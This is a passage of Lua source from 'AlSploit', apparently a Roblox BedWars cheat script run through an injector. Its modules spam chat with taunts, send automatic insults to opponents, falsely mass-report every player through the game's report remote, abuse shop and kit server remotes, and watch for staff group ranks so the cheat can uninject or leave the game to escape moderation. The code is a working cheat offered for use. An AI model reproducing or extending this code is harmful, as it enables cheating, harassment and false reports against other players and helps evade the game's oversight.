		Message1 = "3+ Years Now And The Anticheat Is Still The Same | AlSploit On Top",
		Message2 = "Clowns Are The Only Ones We Eliminate | AlSploit On Top",
		Message3 = "InstantWin Is So Fun 😂 | AlSploit On Top",
		Message4 = "Best Anticheat Ever ™️ | AlSploit On Top",
		Message5 = "Get Back To Scripting, Skids | AlSploit On Top",
		Message6 = "Voidware Has The Best Logger!!! | AlSploit On Top"
	}

	local ChatSpammer = UtilityTab:CreateToggle({
		Name = "ChatSpammer",

		Function = function()			
			repeat
				task.wait()	

				for i, v in next, MessageTable do
					if AlSploitSettings.ChatSpammer.Value == true then
						TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(v)

						task.wait(500 /  AlSploitSettings.ChatSpammer.Speed.Value)
					end
				end
			until AlSploitSettings.ChatSpammer.Value == false or shared.AlSploitUnInjected == true
		end,

		HoverText = "Spams The Chat 🗣️"
	})

	ChatSpammer:CreateSlider({
		Name = "Speed",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 50
	})
end)

task.spawn(function()
	local EntityNotifier = UtilityTab:CreateToggle({
		Name = "EntityNotifier",

		Function = function()
			if AlSploitSettings.EntityNotifier.Value == true then
				AlSploitConnections["EntityNotifierConnection"] = CollectionService:GetInstanceAddedSignal("GuardianOfDream"):Connect(function()		
					CreateNotification(3, "A GuardianOfDream Has Spawned")
				end)

				AlSploitConnections["EntityNotifierConnection"] = CollectionService:GetInstanceAddedSignal("DiamondGuardian"):Connect(function()		
					CreateNotification(3, "A DiamondGuardian Has Spawned")
				end)

				AlSploitConnections["EntityNotifierConnection2"] = CollectionService:GetInstanceAddedSignal("GolemBoss"):Connect(function()		
					CreateNotification(3, "A GolemBoss Has Spawned")
				end)

				AlSploitConnections["EntityNotifierConnection3"] = CollectionService:GetInstanceAddedSignal("skeleton"):Connect(function()		
					CreateNotification(3, "A Skeleton Has Spawned")
				end)

				AlSploitConnections["EntityNotifierConnection4"] = CollectionService:GetInstanceAddedSignal("Drone"):Connect(function()		
					CreateNotification(3, "A Drone Has Spawned")
				end)
			end

			if AlSploitSettings.EntityNotifier.Value == false and AlSploitConnections["EntityNotifierConnection"] then
				for i, v in next, AlSploitConnections do
					if string.find(v, "EntityNotifierConnection") then
						v:Disconnect()
					end
				end
			end
		end,

		HoverText = "Notifies You When An Entity Is Added ➕"
	})
end)

task.spawn(function()
	local OldGlobalChatSystemMessages = ClientStore:getState().Settings.global_chat_system_messages
	local OldProfileVisibility = ClientStore:getState().Settings.profile_visilility
	local OldFriendSpectating = ClientStore:getState().Settings.friendSpectating
	local OldStreamerMode = ClientStore:getState().Settings.streamer_mode

	local Anonymous = UtilityTab:CreateToggle({
		Name = "Anonymous",

		Function = function()			
			if AlSploitSettings.Anonymous.Value == true then
				OldGlobalChatSystemMessages = ClientStore:getState().Settings.global_chat_system_messages
				OldProfileVisibility = ClientStore:getState().Settings.profile_visilility
				OldFriendSpectating = ClientStore:getState().Settings.friendSpectating
				OldStreamerMode = ClientStore:getState().Settings.streamer_mode

				ClientStore:getState().Settings.global_chat_system_messages = false
				ClientStore:getState().Settings.profile_visilility = "private"
				ClientStore:getState().Settings.friendSpectating = false
				ClientStore:getState().Settings.streamer_mode = true
			end

			if AlSploitSettings.Anonymous.Value == false then
				ClientStore:getState().Settings.global_chat_system_messages = OldGlobalChatSystemMessages
				ClientStore:getState().Settings.profile_visilility = OldProfileVisibility
				ClientStore:getState().Settings.friendSpectating = OldFriendSpectating
				ClientStore:getState().Settings.streamer_mode = OldStreamerMode
			end
		end,

		HoverText = "Makes You Anonymous To Players 🕵️"
	})

	UnInjectEvent.Event:Connect(function()
		ClientStore:getState().Settings.global_chat_system_messages = OldGlobalChatSystemMessages
		ClientStore:getState().Settings.friendSpectating = OldFriendSpectating
		ClientStore:getState().Settings.streamer_mode = OldStreamerMode
	end)
end)

task.spawn(function()
	local ReportedList = {}

	local AutoReport = UtilityTab:CreateToggle({
		Name = "AutoReport",

		Function = function()
			repeat
				task.wait(2)

				task.spawn(function()
					for i, v in next, PlayerService:GetPlayers() do
						if v ~= LocalPlayer and v:GetAttribute("PlayerConnected") and not ReportedList[v] then
							BedwarsRemotes.ReportPlayerRemote:FireServer(v.UserId)

							ReportedList[v] = v.UserId
						end					
					end	
				end)		
			until AlSploitSettings.AutoReport.Value == false or shared.AlSploitUnInjected == true
		end,

		HoverText = "Reports Players Automatically 🥊"
	})
end)

task.spawn(function()
	local OldSprintFunction = BedwarsControllers.SprintController.stopSprinting

	local AutoSprint = UtilityTab:CreateToggle({
		Name = "AutoSprint",

		Function = function()			
			if AlSploitSettings.AutoSprint.Value == true then		
				OldSprintFunction = BedwarsControllers.SprintController.stopSprinting

				BedwarsControllers.SprintController.stopSprinting = function(...)
					local Function = OldSprintFunction(...)

					BedwarsControllers.SprintController:startSprinting()

					return Function
				end

				task.spawn(function()
					BedwarsControllers.SprintController:startSprinting()
				end)
			end

			if AlSploitSettings.AutoSprint.Value == false then
				BedwarsControllers.SprintController.stopSprinting = OldSprintFunction
				BedwarsControllers.SprintController:stopSprinting()
			end
		end,

		HoverText = "Makes You Sprint Automatically 🐾"
	})

	UnInjectEvent.Event:Connect(function()
		BedwarsControllers.SprintController.stopSprinting = OldSprintFunction
		BedwarsControllers.SprintController:stopSprinting()
	end)
end)

task.spawn(function()
	local AutoForgeItems = {
		GreatHammer = {
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "wood_great_hammer",
					["price"] = 20,
					["requireInInventoryToTierUp"] = true,
					["nextTier"] = "iron_great_hammer",
					["superiorItems"] = {
						[1] = "iron_great_hammer"
					},
					["currency"] = "iron",
					["amount"] = 1,
					["category"] = "Combat",
					["disabledInQueue"] = {
						[1] = "tnt_wars",
						[2] = "bedwars_og_to4"
					},
					["spawnWithItems"] = {
						[1] = "wood_great_hammer"
					},
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit",
						[4] = "tinker",
						[5] = "summoner",
						[6] = "ice_queen",
						[7] = "ember",
						[8] = "lumen",
						[9] = "summoner"
					}
				},
				["shopId"] = ""
			},	
		},

		Gauntlets = {
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "wood_gauntlets",
					["price"] = 0,
					["requireInInventoryToTierUp"] = true,
					["nextTier"] = "stone_gauntlets",
					["superiorItems"] = {
						[1] = "stone_scythe"
					},
					["currency"] = "iron",
					["amount"] = 20,
					["category"] = "Combat",
					["spawnWithItems"] = {
						[1] = "wood_scythe"
					},
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit",
						[4] = "tinker",
						[5] = "summoner",
						[6] = "ice_queen",
						[7] = "ember",
						[8] = "lumen",
						[9] = "summoner"
					}
				},
				["shopId"] = ""
			}
		},

		Dagger = {
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "wood_dagger",
					["price"] = 0,
					["requireInInventoryToTierUp"] = true,
					["nextTier"] = "stone_dagger",
					["superiorItems"] = {
						[1] = "stone_scythe"
					},
					["currency"] = "iron",
					["amount"] = 20,
					["category"] = "Combat",
					["spawnWithItems"] = {
						[1] = "wood_scythe"
					},
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit",
						[4] = "tinker",
						[5] = "summoner",
						[6] = "ice_queen",
						[7] = "ember",
						[8] = "lumen",
						[9] = "summoner"
					}
				},
				["shopId"] = ""
			}
		},

		Scythe = {
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "wood_scythe",
					["price"] = 0,
					["requireInInventoryToTierUp"] = true,
					["nextTier"] = "stone_scythe",
					["superiorItems"] = {
						[1] = "stone_scythe"
					},
					["currency"] = "iron",
					["amount"] = 20,
					["category"] = "Combat",
					["spawnWithItems"] = {
						[1] = "wood_scythe"
					},
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit",
						[4] = "tinker",
						[5] = "summoner",
						[6] = "ice_queen",
						[7] = "ember",
						[8] = "lumen",
						[9] = "summoner"
					}
				},
				["shopId"] = ""
			}
		}
	}		

	local AutoForge = UtilityTab:CreateToggle({
		Name = "AutoForge",

		Function = function()
			repeat
				task.wait(0.5)

				if IsAlive(LocalPlayer) == true and GetMatchState() ~= 0 then
					local NearestNpc = FindNearestNpc(AlSploitSettings.AutoForge.Range.Value)

					if NearestNpc then
						for i, v in next, AutoForgeItems do
							v[1].shopId = NearestNpc.Name
						end
						if AlSploitSettings.AutoForge.ForgeItems.GreatHammer.Value == true then							
							PurchaseItem(AutoForgeItems.GreatHammer)
						end

						if AlSploitSettings.AutoForge.ForgeItems.Gauntlets.Value == true then							
							PurchaseItem(AutoForgeItems.Gauntlets)
						end

						if AlSploitSettings.AutoForge.ForgeItems.Dagger.Value == true then							
							PurchaseItem(AutoForgeItems.Dagger)
						end

						if AlSploitSettings.AutoForge.ForgeItems.Scythe.Value == true then							
							PurchaseItem(AutoForgeItems.Scythe)
						end
					end
				end			
			until shared.AlSploitUnInjected == true or AlSploitSettings.AutoForge.Value == false
		end,

		HoverText = "Automatically Forges Items For You 🐢"
	})

	AutoForge:CreateSlider({
		Name = "Range",

		Function = function() end,

		MaximumValue = 30,
		DefaultValue = 30
	})

	local ForgeItems = AutoForge:CreateDropdown({
		Name = "ForgeItems",
		HoverText = "Pick Which Items Will Forge"
	})

	ForgeItems:CreateToggle({
		Name = "GreatHammer",

		Function = function() end,

		DefaultValue = false
	})

	ForgeItems:CreateToggle({
		Name = "Gauntlets",

		Function = function() end,

		DefaultValue = false
	})

	ForgeItems:CreateToggle({
		Name = "Dagger",

		Function = function() end,

		DefaultValue = false
	})

	ForgeItems:CreateToggle({
		Name = "Scythe",

		Function = function() end,

		DefaultValue = true
	})
end)

task.spawn(function()
	local AutoBankItemsDroppedItems = {}
	local AutoBankDropItems = {"iron", "diamond", "diamond", "emerald", "void_crystal"}

	local function SecureAutoBankItems()

	end

	local AutoBank = UtilityTab:CreateToggle({
		Name = "AutoBank",

		Function = function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) == true and AlSploitSettings.AutoBank.Value == true then
					if LocalPlayer.Character:GetAttribute("Health") <= AlSploitSettings.AutoBank.MinHealth.Value then
						for i, v in next, ReplicatedStorageService.Inventories:GetChildren() do
							if v.Name == LocalPlayer.Name then
								for i2, v2 in next, v:GetChildren() do
									if v2.Name == AutoBankItems[1] or v2.Name == AutoBankItems[2] or v2.Name == AutoBankItems[3] or v2.Name == AutoBankItems[4] or v2.Name == AutoBankItems[5] then
										if not AutoBankItems[v2] then
											local Success, Response = pcall(function()
												BedwarsRemotes.DropItemRemote:InvokeServer({item = v, amount = v2:GetAttribute("Amount")})
											end)

											if Success then
												table.insert(AutoBankItems, v2)

												task.spawn(function()
													repeat
														task.wait(0.1)

														v2.CFrame = CFrame.new(Vector3.new(0, 150, 0))
													until AlSploitSettings.AutoBank.Value == false or shared.AlSploitUnInjected == true or (IsAlive(LocalPlayer) == true and LocalPlayer.Character:GetAttribute("Health") > AlSploitSettings.AutoBank.MinHealth.Value or false)

													repeat task.wait() until IsAlive(LocalPlayer) == true

													v2.CFrame = LocalPlayer.Character.PrimaryPart.CFrame

													BedwarsRemotes.PickupItemDropRemote:InvokeServer({itemDrop = v2})

													AutoBankItems[v2] = nil
												end)
											end
										end
									end
								end
							end
						end
					end
				end
			until AlSploitSettings.AutoBank.Value == false or shared.AlSploitUnInjected == true
		end,

		HoverText = "Makes You Toxic 🤬"
	})

	AutoBank:CreateSlider({
		Name = "MinHealth",

		Function = function() end,

		MaximumValue = 100,
		DefaultValue = 30
	})
end)

task.spawn(function()
	local AutoToxicMessages = {
		"Voidware ain't making a return with this one. L %s | AlSploit on top",
		"I hack for fun. Too bad your fun is ruined. L %s | AlSploit on top",
		"I ruined a good day for a good reason. L %s | AlSploit on top",
		"Rats. Imagine dying in a block game. L %s | AlSploit on top",
		"Clowns are the only ones we kill. L %s | AlSploit on top"
	}

	local function SendAutoToxicMessage(Player)
		local AutoToxicMessage = string.format(AutoToxicMessages[math.random(1, #AutoToxicMessages)], Player.DisplayName)

		TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(AutoToxicMessage)
	end

	local AutoToxic = UtilityTab:CreateToggle({
		Name = "AutoToxic",

		Function = function() end,

		HoverText = "Makes You Toxic 🤬"
	})

	repeat task.wait() until shared.AlSploitUnInjected == true or GetMatchState() ~= 0

	task.spawn(function()
		for i, v in next, PlayerService:GetPlayers() do
			task.spawn(function()
				if IsAlive(v) == true then
					if v.Team ~= LocalPlayer.Team and v ~= LocalPlayer then
						repeat task.wait() until AlSploitSettings.AutoToxic.Value == false or shared.AlSploitUnInjected == true or GetMatchState() ~= 0

						if AlSploitSettings.AutoToxic.Value == true and shared.AlSploitUnInjected == false then
							SendAutoToxicMessage(v)
						end
					end 	
				end	
			end)			

			task.spawn(function()
				AlSploitConnections["AutoToxicConnection"] = v.CharacterAdded:Connect(function(Character)
					task.wait(0.3)

					local v = game.Players:FindFirstChild(Character.Name) or v

					if IsAlive(v) == true then
						if v.Team ~= LocalPlayer.Team and v ~= LocalPlayer then
							repeat task.wait() until AlSploitSettings.AutoToxic.Value == false or shared.AlSploitUnInjected == true or GetMatchState() ~= 0

							if AlSploitSettings.AutoToxic.Value == true and shared.AlSploitUnInjected == false then
								SendAutoToxicMessage(v)
							end
						end
					end
				end)
			end)
		end
	end)	
end)

task.spawn(function()
	local AutoBuyItems = {
		JadeHammer = {
			[1] = {
				["shopItem"] = {
					["amount"] = 1,
					["lockAfterPurchase"] = true,
					["itemType"] = "jade_hammer",
					["category"] = "Combat",
					["price"] = 40,
					["requiresKit"] = {
						[1] = "jade"
					},
					["spawnWithItems"] = {
						[1] = "jade_hammer"
					},
					["currency"] = "iron"
				},
				["shopId"] = ""
			}
		},

		GompyVacuum = {
			[1] = {
				["shopItem"] = {
					["amount"] = 1,
					["lockAfterPurchase"] = true,
					["itemType"] = "vacuum",
					["category"] = "Combat",
					["price"] = 50,
					["requiresKit"] = {
						[1] = "ghost_catcher"
					},
					["spawnWithItems"] = {
						[1] = "vacuum"
					},
					["currency"] = "iron"
				},
				["shopId"] = ""
			}
		},

		Guitar = {
			[1] = {
				["shopItem"] = {
					["amount"] = 1,
					["lockAfterPurchase"] = true,
					["itemType"] = "guitar",
					["category"] = "Combat",
					["price"] = 16,
					["requiresKit"] = {
						[1] = "melody"
					},
					["spawnWithItems"] = {
						[1] = "guitar"
					},
					["currency"] = "iron"
				},
				["shopId"] = ""
			}
		},

		Lasso = {
			[1] = {
				["shopItem"] = {
					["amount"] = 1,
					["lockAfterPurchase"] = true,
					["itemType"] = "lasso",
					["category"] = "Combat",
					["price"] = 30,
					["requiresKit"] = {
						[1] = "cowgirl"
					},
					["spawnWithItems"] = {
						[1] = "lasso"
					},
					["currency"] = "iron"
				},
				["shopId"] = ""
			}
		},

		Arrow = {
			[1] = {
				["shopItem"] = {
					["currency"] = "iron",
					["itemType"] = "arrow",
					["amount"] = 8,
					["price"] = 16,
					["category"] = "Combat"
				},
				["shopId"] = ""
			}
		},

		Wool = {
			[1] = {
				["shopItem"] = {
					["currency"] = "iron",
					["itemType"] = "wool_white",
					["amount"] = 16,
					["price"] = 8,
					["category"] = "Blocks"
				},
				["shopId"] = ""
			}
		},	

		Bow = {
			[1] = {
				["shopItem"] = {
					["ignoredByKit"] = {
						[1] = "flower_bee"
					},
					["itemType"] = "wood_bow",
					["price"] = 24,
					["superiorItems"] = {
						[1] = "wood_crossbow",
						[2] = "tactical_crossbow"
					},
					["currency"] = "iron",
					["category"] = "Combat",
					["lockAfterPurchase"] = true,
					["spawnWithItems"] = {
						[1] = "wood_bow"
					},
					["amount"] = 1
				},
				["shopId"] = ""
			}
		},

		EmeraldArmor = {
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "emerald_chestplate",
					["price"] = 40,
					["customDisplayName"] = "Emerald Armor",
					["currency"] = "emerald",
					["category"] = "Combat",
					["nextTier"] = "",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "emerald_helmet",
						[2] = "emerald_chestplate",
						[3] = "emerald_boots"
					},
					["amount"] = 1
				},
				["shopId"] = ""
			}
		},

		DiamondArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "Diamond_chestplate",
					["price"] = 8,
					["customDisplayName"] = "Diamond Armor",
					["currency"] = "emerald",
					["category"] = "Combat",
					["nextTier"] = "diamond_chestplate",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "diamond_helmet",
						[2] = "diamond_chestplate",
						[3] = "diamond_boots"
					},
					["amount"] = 1
				},
				["shopId"] = ""
			}
		},

		IronArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "iron_chestplate",
					["price"] = 120,
					["customDisplayName"] = "Iron Armor",
					["currency"] = "iron",
					["category"] = "Combat",
					["nextTier"] = "diamond_chestplate",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "iron_helmet",
						[2] = "iron_chestplate",
						[3] = "iron_boots"
					},
					["amount"] = 1
				},
				["shopId"] = ""
			}
		},

		LeatherArmor ={
			[1] = {
				["shopItem"] = {
					["lockAfterPurchase"] = true,
					["itemType"] = "leather_chestplate",
					["price"] = 50,
					["customDisplayName"] = "Leather Armor",
					["currency"] = "iron",
					["category"] = "Combat",
					["nextTier"] = "iron_chestplate",
					["ignoredByKit"] = {
						[1] = "bigman"
					},
					["spawnWithItems"] = {
						[1] = "leather_helmet",
						[2] = "leather_chestplate",
						[3] = "leather_boots"
					},
					["amount"] = 1
				},
				["shopId"] = ""
			}
		},

		EmeraldSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "emerald_sword",
					["price"] = 20,
					["superiorItems"] = {
						[1] = ""
					},
					["currency"] = "iron",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = ""
			}
		},

		VoidSword = {
			[1] = {
				["shopItem"] = {
					["currency"] = "void_crystal",
					["itemType"] = "void_sword",
					["amount"] = 1,
					["price"] = 10,
					["category"] = "Void",
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher"
					},
					["lockAfterPurchase"] = true
				},
				["shopId"] = ""
			}
		},

		DiamondSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "diamond_sword",
					["price"] = 4,
					["superiorItems"] = {
						[1] = "emerald_sword"
					},
					["currency"] = "emerald",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = ""
			}
		},

		IronSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "iron_sword",
					["price"] = 70,
					["superiorItems"] = {
						[1] = "diamond_sword"
					},
					["currency"] = "iron",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = ""
			}
		},

		StoneSword = {
			[1] = {
				["shopItem"] = {
					["disabledInQueue"] = {
						[1] = "tnt_wars"
					},
					["itemType"] = "stone_sword",
					["price"] = 20,
					["superiorItems"] = {
						[1] = "iron_sword"
					},
					["currency"] = "iron",
					["amount"] = 1,
					["ignoredByKit"] = {
						[1] = "barbarian",
						[2] = "dasher",
						[3] = "frost_hammer_kit"
					},
					["category"] = "Combat",
					["lockAfterPurchase"] = true
				},
				["shopId"] = ""
			}
		}
	}

	local AutoBuy = UtilityTab:CreateToggle({
		Name = "AutoBuy",

		Function = function()
			repeat
				task.wait(0.3)

				if IsAlive(LocalPlayer) then
					local NearestNpc = FindNearestNpc(AlSploitSettings.AutoBuy.Range.Value) 

					if NearestNpc then
						for i, v in next, AutoBuyItems do
							v[1].shopId = NearestNpc.Name
						end

						task.spawn(function()	
							if not HasItem("lasso") and AlSploitSettings.ProjectileAura.Value == true then
								PurchaseItem(AutoBuyItems.Lasso)
							end

							if not HasItem("jade_hammer") and AlSploitSettings.AutoKit.Value == true then
								PurchaseItem(AutoBuyItems.JadeHammer)
							end

							if not HasItem("vacuum") and AlSploitSettings.ProjectileAura.Value == true then
								PurchaseItem(AutoBuyItems.GompyVacuum)
							end

							if not HasItem("guitar") and AlSploitSettings.AutoKit.Value == true then
								PurchaseItem(AutoBuyItems.Guitar)
							end
						end)

						task.spawn(function()
							if HasItem("diamond_sword") then
								PurchaseItem(AutoBuyItems.EmeraldSword)
							end

							if HasItem("iron_sword") or HasItem("stone_sword") or HasItem("wood_sword") then
								PurchaseItem(AutoBuyItems.DiamondSword)
							end

							if HasItem("stone_sword") and HasItem("iron_chestplate") then			
								PurchaseItem(AutoBuyItems.IronSword)
							end

							if HasItem("wood_sword") then
								PurchaseItem(AutoBuyItems.StoneSword)
							end

							PurchaseItem(AutoBuyItems.VoidSword)
						end)

						task.spawn(function()
							if HasItem("diamond_chestplate") then
								PurchaseItem(AutoBuyItems.EmeraldArmor)
							end	

							if HasItem("iron_chestplate") then								
								PurchaseItem(AutoBuyItems.DiamondArmor)
							end	

							if HasItem("stone_sword") and not HasItem("iron_chestplate") and not HasItem("diamond_chestplate") and not HasItem("emerald_chestplate") then
								PurchaseItem(AutoBuyItems.LeatherArmor)
							end	

							if HasItem("leather_chestplate") then
								PurchaseItem(AutoBuyItems.IronArmor)
							end					
						end)

						task.spawn(function()
							if HasItem("iron_chestplate") and HasItem("iron_sword") and not HasItem("wood_bow") and AlSploitSettings.ProjectileAura.Value == true then				
								PurchaseItem(AutoBuyItems.Bow)
							end
						end)

						task.spawn(function()
							if HasItem("iron_chestplate") and HasItem("iron_sword") and HasItem("wood_bow") and AlSploitSettings.ProjectileAura.Value == true then
								PurchaseItem(AutoBuyItems.Arrow)
							end
						end)

						task.spawn(function()
							if HasItem("iron_chestplate") and HasItem("iron_sword") and HasItem("wood_bow") and HasItem("arrow") and AlSploitSettings.Scaffold.Value == true then
								PurchaseItem(AutoBuyItems.Wool)
							end
						end)
					end
				end
			until shared.AlSploitUnInjected == true or AlSploitSettings.AutoBuy.Value == false
		end,

		HoverText = "Autobuys Items For You 💰"
	})

	AutoBuy:CreateSlider({
		Name = "Range",

		Function = function() end,

		MaximumValue = 30,
		DefaultValue = 30
	})
end)

--herew3e4sdjkpu0-;tgbyhdeijks3489ws3eds3ed4

task.spawn(function()
	local AntiStaff = UtilityTab:CreateToggle({
		Name = "AntiStaff",

		Function = function()			
			task.spawn(function()
				task.spawn(function()
					AlSploitConnections["AntiStaffConnection"] = PlayerService.PlayerAdded:Connect(function(Player)
						if shared.AlSploitUnInjected == false and AlSploitSettings.AntiStaff.Value == true and Player:IsInGroup(5774246) and Player:GetRankInGroup(5774246) > 1 then
							if AlSploitSettings.AntiStaff.LeaveParty.Value == true then
								BedwarsControllers.QueueController.leaveParty()
							end

							if AlSploitSettings.AntiStaff.UnInject.Value == true then
								UnInjectEvent:Fire()
							end	

							if AlSploitSettings.AntiStaff.Kick.Value == true then
								LocalPlayer:Kick(Player.Name .. ", A Staff Has Joined Your Game!")
							end	

							CreateNotification(60, Player.Name .. ", A Staff Has Joined Your Game!")
						end
					end)
				end)

				task.spawn(function()
					task.wait(2)

					for i, v in next, PlayerService:GetPlayers() do
						if shared.AlSploitUnInjected == false and AlSploitSettings.AntiStaff.Value == true and v:IsInGroup(5774246) and v:GetRankInGroup(5774246) > 1 then
							if AlSploitSettings.AntiStaff.LeaveParty.Value == true then
								BedwarsControllers.QueueController.leaveParty()
							end

							if AlSploitSettings.AntiStaff.UnInject.Value == true then
								UnInjectEvent:Fire()
							end	

							if AlSploitSettings.AntiStaff.Kick.Value == true then
								LocalPlayer:Kick(v.Name .. ", A Staff Has Joined Your Game!")
							end	

							CreateNotification(60, v.Name .. ", A Staff Has Joined Your Game!")						
						end
					end
				end)
			end)
		end,

		HoverText = "Tells You When A Staff Joins 🔔"
	})

	AntiStaff:CreateToggle({
		Name = "LeaveParty",

		Function = function() end,

		DefaultValue = true
	})

	AntiStaff:CreateToggle({
		Name = "Uninject",

		Function = function() end,

		DefaultValue = true
	})

	AntiStaff:CreateToggle({
		Name = "Kick",

		Function = function() end,

		DefaultValue = false
	})
end)

task.spawn(function()
	local AntiAfk = UtilityTab:CreateToggle({
		Name = "AntiAfk",

		Function = function()
			repeat
				BedwarsRemotes.AfkInfoRemote:FireServer({afk = false})

				task.wait(60)
			until AlSploitSettings.AlSploitUnInjected == true or AlSploitSettings.AntiAfk.Value == false
		end,

		HoverText = "Prevents From Making You Afk ⌛"
	})
end)

task.spawn(function()
	local AutoKit = UtilityTab:CreateToggle({
		Name = "AutoKit",

		Function = function()
			repeat
				task.wait()

				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
					task.spawn(function()
						if AlSploitSettings.AutoKit.Kits.ElderTree.Value == true then
							task.wait(0.5)

							local NearestTreeOrb = FindNearestTreeOrb(30)

							if NearestTreeOrb and NearestTreeOrb:GetAttribute("TreeOrbSecret") then
								if EquippedKit == "bigman" then
									if BedwarsRemotes.ConsumeTreeOrbRemote:InvokeServer({treeOrbSecret = NearestTreeOrb:GetAttribute("TreeOrbSecret")}) then
										CollectionService:RemoveTag(NearestTreeOrb, "treeOrb")
										NearestTreeOrb:Destroy()
									end
								end
							end
						end
					end)	

					task.spawn(function()
						if AlSploitSettings.AutoKit.Kits.Fortuna then
							if EquippedKit == "card" then
								task.wait(0.5)

								local NearestEntity = FindNearestEntity(30)

								if NearestEntity then
									BedwarsRemotes.AttemptCardThrowRemote:FireServer({targetEntityInstance = NearestEntity})
								end
							end
						end
					end)

					task.spawn(function()
						if AlSploitSettings.AutoKit.Kits.Warden.Value == true then
							task.wait(0.5)

							if EquippedKit == "jailor" then
								for i, v in next, CollectionService:GetTagged("jailor_soul_ProximityPrompt") do
									BedwarsRemotes.CollectCollectableEntityRemote:FireServer({id = v:GetAttribute("Id"), collectableName = "JailorSoul"})
								end
							end
						end
					end)

					task.spawn(function()
						if AlSploitSettings.AutoKit.Kits.Hannah.Value == true then
							task.wait(0.1)

							if EquippedKit == "hannah" then
								for i, v in next, (CollectionService:GetTagged("HannahExecuteInteraction")) do
									BedwarsRemotes.HannahPromptTriggerRemote:CallServer({user = LocalPlayer, victimEntity = v})
								end
							end
						end
					end)

					task.spawn(function()
						if AlSploitSettings.AutoKit.Kits.Gompy.Value == true then
							task.wait(0.25)

							local NearestGhost = FindNearestGhost(30)

							if NearestGhost then
								if EquippedKit == "ghost_catcher" then
								end
								BedwarsRemotes.CollectCollectableEntityRemote:FireServer({id = NearestGhost})
							end
						end
					end)

					task.spawn(function()
						if AlSploitSettings.AutoKit.Kits.Trinity.Value == true then
							task.wait(0.5)

							if EquippedKit == "angel" and ClientStore:getState().Kit.angelProgress >= 1 and LocalPlayer.Character:GetAttribute("AngelType") == nil then
								BedwarsRemotes.TrinitySetAngelTypeRemote:FireServer({angel = "Void"})
							end
						end
					end)				

					task.spawn(function()
						if AlSploitSettings.AutoKit.Kits.Miner.Value == true then
							task.wait(0.25)

							if EquippedKit == "miner" then
								for i, v in next, CollectionService:GetTagged("petrified-player") do 
									BedwarsRemotes.DestroyPetrifiedPlayerRemote:FireServer({petrifyId = v:GetAttribute("PetrifyId")})
								end
							end
						end						
					end)					
				end
			until AlSploitSettings.AlSploitUnInjected == true or AlSploitSettings.AutoKit.Value == false
		end,

		HoverText = "Automatically Uses The Ability Of Kits 😺"
	})

	local Kits = AutoKit:CreateDropdown({
		Name = "Kits",				
		HoverText = "Pick The Kits That Will Be Used Automatically"
	})

	Kits:CreateToggle({
		Name = "ElderTree",

		Function = function() end,

		DefaultValue = true
	})

	Kits:CreateToggle({
		Name = "Fortuna",

		Function = function() end,

		DefaultValue = true
	})

	Kits:CreateToggle({
		Name = "Warden",

		Function = function() end,

		DefaultValue = true
	})

	Kits:CreateToggle({
		Name = "Hannah",

		Function = function() end,

		DefaultValue = true
	})

	Kits:CreateToggle({
		Name = "Gompy",

		Function = function() end,

		DefaultValue = true
	})

	Kits:CreateToggle({
		Name = "Trinity",

		Function = function() end,

		DefaultValue = true
	})

	Kits:CreateToggle({
		Name = "Miner",

		Function = function() end,

		DefaultValue = true
	})
end)

task.spawn(function()
	local OldFov = BedwarsControllers.FovController.fov

	local Fov = UtilityTab:CreateToggle({
		Name = "Fov",

		Function = function()			
			repeat
				task.wait()

				BedwarsControllers.FovController:setFOV(AlSploitSettings.Fov.Fov.Value)
			until shared.AlSploitUnInjected == true or AlSploitSettings.Fov.Value == false

			BedwarsControllers.FovController.fov = OldFov
		end,

		HoverText = "Changes Your Fov 👀"
	})

	Fov:CreateSlider({
		Name = "Fov",

		Function = function() end,

		MaximumValue = 120,
		DefaultValue = 120
	})
end)

task.spawn(function()	
	local OldHealthbarClone = LocalPlayer.PlayerGui:WaitForChild("hotbar"):WaitForChild("1"):WaitForChild("HotbarHealthbarContainer"):WaitForChild("HealthbarProgressWrapper"):Clone()
